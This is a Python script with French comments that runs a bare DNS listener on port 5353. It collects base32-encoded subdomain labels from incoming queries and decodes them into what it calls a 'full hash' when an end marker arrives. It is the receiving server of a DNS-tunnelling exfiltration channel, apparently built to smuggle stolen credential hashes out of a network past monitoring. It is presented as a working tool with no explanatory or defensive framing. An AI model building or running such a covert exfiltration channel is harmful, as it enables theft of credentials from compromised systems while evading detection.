import socket
import base64
import os
from datetime import datetime

LOG_DIRECTORY = "dns_logs"

def initialize_logs():
    """Initialise le répertoire des logs."""
    os.makedirs(LOG_DIRECTORY, exist_ok=True)

def create_new_file():
    """Crée un nouveau fichier pour une nouvelle routine."""
    filename = f"{LOG_DIRECTORY}/routine_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    print(f"New routine started. Logging to: {filename}")
    return filename

def append_to_file(filename, domain_part):
    """Ajoute une partie de domaine dans le fichier."""
    with open(filename, "a") as file:
        file.write(domain_part + ".")

def decode_file(filename):
    """Lit, décode le contenu du fichier courant et remplace les données encodées."""
    try:
        with open(filename, "r") as file:
            encoded_data = file.read().strip(".")
        
        # Supprimer les points et ajouter du padding si nécessaire
        encoded_no_dots = encoded_data.replace(".", "")
        encoded_no_dots += "=" * ((8 - len(encoded_no_dots) % 8) % 8)

        # Décoder les données
        decoded_data = base64.b32decode(encoded_no_dots.upper()).decode("utf-8")
        print(f"Decoded full hash: {decoded_data}")

        # Réécrire le fichier txt
        with open(filename, "w") as file:
            file.write(f"Encoded (no dots): {encoded_no_dots}\n")
            file.write(f"Decoded hash: {decoded_data}\n")
    except Exception as e:
        print(f"Error decoding file: {e}")

def log_request(data, filename):
    """Traite une requête DNS."""
    try:
        domain_name = []
        i = 12
        while data[i] != 0:
            length = data[i]
            i += 1
            domain_name.append(data[i:i+length].decode("utf-8"))
            i += length
        domain_name = ".".join(domain_name)

        if domain_name.lower() == "mvxgi.mvxgi": # end.end en base 32
            print("End request received. Decoding the full hash...")
            decode_file(filename)
            return create_new_file()  # Nouveau fichier pour la "routine"
        else:
            append_to_file(filename, domain_name)
            print(f"Appended: {domain_name}")
        return filename
    except Exception as e:
        print(f"Failed to parse request: {e}")
        return filename

def start_dns_server():
    """Démarre le serveur DNS."""
    server_address = ("0.0.0.0", 5353)
    print(f"DNS server listening on {server_address[0]}:{server_address[1]}")

    filename = create_new_file()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind(server_address)
        while True:
            try:
                data, _ = sock.recvfrom(512)
                filename = log_request(data, filename)
            except KeyboardInterrupt:
                print("\nServer shutting down.")
                break
            except Exception as e:
                print(f"Error handling request: {e}")

if __name__ == "__main__":
    initialize_logs()
    start_dns_server()
